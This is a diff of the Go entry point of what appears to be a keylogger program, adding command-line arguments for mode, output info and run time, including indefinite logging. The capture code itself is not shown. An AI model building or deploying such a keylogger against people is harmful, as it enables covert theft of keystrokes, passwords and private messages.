@@ -1,19 +1,34 @@
 package main
 
-// "fmt"
+import (
+	"fmt"
+	"os"
+	"strconv"
+)
 
 func main() {
 
-	k := createKeylogger()
-	k.setMode(0, "log.txt")
+	args := os.Args
 
-	// fmt.Println("Start logging")
-	k.start(13)
-	// fmt.Println("DONE")
+	if len(args) != 4 {
+		fmt.Println("Bad command line arguments.\nUsage: .\\keylogger.exe [mode] [info] [time (s)]")
+		fmt.Println("Pass a time of -1 to run indefinitely.")
+	} else {
+		mode, err := strconv.Atoi(args[1])
+		if err != nil {
+			panic(err)
+		}
 
-	// for _, key := range k.getDownEvents() {
-	// 	fmt.Print(key.name, " ")
-	// }
+		time, err := strconv.Atoi(args[3])
+		if err != nil {
+			panic(err)
+		}
+
+		k := createKeylogger()
+		k.setMode(mode, args[2])
+
+		k.start(time)
+	}
 
 }
 
